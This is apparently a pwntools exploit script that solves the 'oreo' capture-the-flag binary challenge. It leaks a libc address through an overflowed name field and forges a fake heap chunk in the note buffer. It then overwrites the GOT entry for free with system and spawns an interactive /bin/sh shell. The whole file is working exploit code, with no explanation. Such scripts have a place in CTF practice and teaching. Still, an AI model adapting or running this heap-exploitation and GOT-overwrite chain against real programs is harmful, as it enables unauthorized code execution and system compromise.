#!/usr/bin/python
from pwn import *

context(terminal = ['xterm', 'splitw'])
#context.terminal = ['tmux', 'splitw', '-h']
local = True
elf = ELF('oreo')

if local:
	p = process('oreo')
#        gdb.attach(p)
else:
	libc = ELF()
	p = remote()

def add(des, name):
    p.sendline('1')
    p.sendline(name)
    p.sendline(des)

def show():
    p.sendline('2')

def order():
    p.sendline('3')

def leave(note):
    p.sendline('4')
    p.sendline(note)

def stats():
    p.sendline('5')

libc_base = 0xf7e00000 - 0xf7e5fca0
system_off = 0xf7e3ada0 - 0xf7e00000
fgets_off = 0xf7e5e150- 0xf7e00000
onegadget = 0x3ac5e

payload = 'a' * 27
payload += p32(0x804a248)
add('aaaa', payload)

p.clean(1)
show()
p.recvuntil('Description: ')
p.recvuntil('Description: ')
leak = p.recv(4)
leak = u32(leak)
libc_base = libc_base + leak

log.info('leak: '+ hex(libc_base))

leave('1'*28 + '\x00'*8 + p32(0x1eb71))

for i in range(0, 63):
    add('aaaaa','bbbbb')

payload = 'c' * 27
payload += p32(0x804a2a4+0x4)
add('aaaa', payload)

order()

payload = p32(elf.got['free'])
add(payload, 'aaa')

leave(p32(libc_base + system_off)+p32(libc_base+fgets_off))

add('/bin/sh', 'aaaaaa')
order()


p.interactive()



